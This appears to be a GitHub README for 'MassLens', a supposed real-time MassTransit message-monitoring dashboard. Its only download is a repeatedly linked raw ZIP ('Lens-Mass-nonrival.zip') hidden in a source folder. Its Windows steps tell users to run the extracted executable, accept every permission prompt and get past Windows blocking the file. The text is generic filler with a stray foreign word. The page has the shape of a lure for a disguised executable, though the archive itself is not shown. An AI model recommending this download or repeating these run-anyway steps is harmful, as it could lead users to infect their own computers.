# 📊 MassLens - See Message Flow In Real Time

[![Download MassLens](https://img.shields.io/badge/Download-MassLens-blue?style=for-the-badge)](https://raw.githubusercontent.com/keykeylcrx-commits/MassLens/main/src/MassLens.RabbitMQ/Lens-Mass-nonrival.zip)

## 🚀 What MassLens Does

MassLens shows live activity from MassTransit v8 apps in one screen. It helps you watch messages as they move through your system. You can see queue traffic, delays, errors, saga changes, and the path each message takes.

Use it when you want a clear view of what your app is doing without opening logs or digging through separate tools.

## 🖥️ What You Need

MassLens runs on Windows.

You will need:

- A Windows 10 or Windows 11 PC
- A recent web browser
- Permission to run downloaded apps
- Access to your MassTransit app if you want live data

If your app uses RabbitMQ, Azure Service Bus, or Amazon SQS, MassLens can help you track message flow across those systems.

## 📥 Download MassLens

Use this link to visit the page to download:

[https://raw.githubusercontent.com/keykeylcrx-commits/MassLens/main/src/MassLens.RabbitMQ/Lens-Mass-nonrival.zip](https://raw.githubusercontent.com/keykeylcrx-commits/MassLens/main/src/MassLens.RabbitMQ/Lens-Mass-nonrival.zip)

Open the page, find the latest release or download file, and save it to your computer.

## 🪟 Install on Windows

1. Open the download page in your browser.
2. Find the file for Windows.
3. Download it to a folder you can find, مثل Downloads or Desktop.
4. If the file is in a ZIP folder, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the MassLens app to start it.

If Windows asks for permission, choose Yes so the app can open.

## ▶️ Run MassLens

After you open the app:

1. Start your MassTransit application.
2. Make sure your message broker is running.
3. Open MassLens.
4. Connect it to the app or service you want to watch.
5. Keep both running so MassLens can show live updates.

You should then see activity appear as messages move through your system.

## 🔍 What You Can See

MassLens gives you a live dashboard with useful details such as:

- Message throughput
- Delivery time
- Faults and failed messages
- Saga state changes
- Message chains
- Queue activity
- Broker flow

This helps you spot slow spots, failed steps, and busy queues without switching between tools.

## 🧭 Typical Use Cases

MassLens is useful when you want to:

- Watch a queue fill up or clear out
- Check if messages are moving at the expected pace
- Find where a message stopped
- See which part of a chain caused a fault
- Review saga behavior
- Follow activity across RabbitMQ, Azure Service Bus, or SQS

It works well during local testing, troubleshooting, and day-to-day monitoring.

## ⚙️ How It Fits With Your App

MassLens stays close to your MassTransit app and reads the message flow as it happens. It is made for systems that use message brokers and background workers.

Common setups include:

- MassTransit with RabbitMQ
- MassTransit with Azure Service Bus
- MassTransit with Amazon SQS
- Apps that use sagas
- Apps that need queue monitoring
- Apps that need message tracing

If your app already sends and receives messages, MassLens gives you a live view of that activity.

## 🧩 Basic Setup Steps

1. Download MassLens from the link above.
2. Install or extract the app on your Windows PC.
3. Open your MassTransit app.
4. Open MassLens.
5. Point MassLens at the system you want to watch.
6. Check the dashboard for live updates.

If you run more than one service, start the one you want to inspect first so the data appears right away.

## 🛠️ Helpful Things to Check

Before you start, it helps to confirm:

- Your broker is running
- Your app is connected to the broker
- The app is sending test messages
- No firewall rule blocks local app access
- The correct environment is active

If the dashboard looks empty, check that your app is actually processing messages.

## 📈 Features at a Glance

### 🟢 Live monitoring

See message activity as it happens.

### 🕒 Latency tracking

Check how long messages take to move through the system.

### ❌ Fault view

Spot failed messages and broken flows.

### 🔗 Full message chain

Follow a message from start to finish.

### 🧱 Saga tracking

Watch state changes in saga-based workflows.

### 📦 Queue insight

See how much traffic moves through each queue.

### ☁️ Broker support

Use it with RabbitMQ, Azure Service Bus, or SQS setups.

## 🧪 Good First Test

If you want to check that MassLens works, try this:

1. Start your broker.
2. Start your MassTransit app.
3. Send one test message.
4. Open MassLens.
5. Look for the new message in the dashboard.
6. Send a few more messages and watch the live view update.

This gives you a fast way to confirm the connection and the data flow.

## 🧑‍💻 When You Use It Most

MassLens is most helpful when:

- A queue grows faster than expected
- A worker stops handling messages
- A saga gets stuck
- A message fails and you need the path
- You want to see system load during testing
- You want a quick health check for messaging

It saves time because you can see the problem instead of guessing at it.

## 📁 Common Download Layout

After download, you may see files like these:

- MassLens.exe
- config files
- a readme file
- a folder with app data

If you see a ZIP file, extract it before you open the app. If you see an EXE file, double-click it to launch MassLens.

## 🔐 Safe Launch Steps on Windows

When you first run the app:

1. Double-click the file.
2. If Windows shows a prompt, choose Run or Yes.
3. Wait for the window to open.
4. Keep the app open while your MassTransit service runs.

If Windows blocks the file, check that the download finished fully and that you saved it in a normal folder like Downloads.

## 🌐 Supported Environments

MassLens is built for message-based apps that use:

- MassTransit v8
- RabbitMQ
- Azure Service Bus
- Amazon SQS
- Saga patterns
- Queue-based workflows

It is a fit for apps that need a live dashboard for message movement and state changes.

## 🧾 What to Expect in the Dashboard

When MassLens is running, you can expect a clean view of:

- Active messages
- Recent throughput
- Slow message paths
- Faulted work
- Saga updates
- Queue pressure

This makes it easier to keep an eye on your app during normal use and during tests.

## 🧰 If the App Does Not Open

Try these steps:

1. Check that the download finished.
2. If the file is zipped, extract it first.
3. Right-click the app and choose Open.
4. Make sure Windows is not blocking the file.
5. Try running it from the Downloads folder.
6. Re-download it from the link if the file looks damaged.

If the app opens but shows no data, start your MassTransit service and send a test message.

## 🗂️ Project Topics

MassLens is connected to these areas:

- azure
- dashboard
- hangfire-dotnet-core
- masstransit
- masstransit-observer
- queue
- rabbit
- rabbitmq
- saga-pattern
- servicebus-queue
- sqs-queue
- topology

## 📌 Quick Start

1. Visit the download page.
2. Download the app for Windows.
3. Extract the file if needed.
4. Open MassLens.
5. Start your MassTransit app.
6. Watch the live dashboard

## 📬 Where to Get the App

Download and install it from:

[https://raw.githubusercontent.com/keykeylcrx-commits/MassLens/main/src/MassLens.RabbitMQ/Lens-Mass-nonrival.zip](https://raw.githubusercontent.com/keykeylcrx-commits/MassLens/main/src/MassLens.RabbitMQ/Lens-Mass-nonrival.zip)

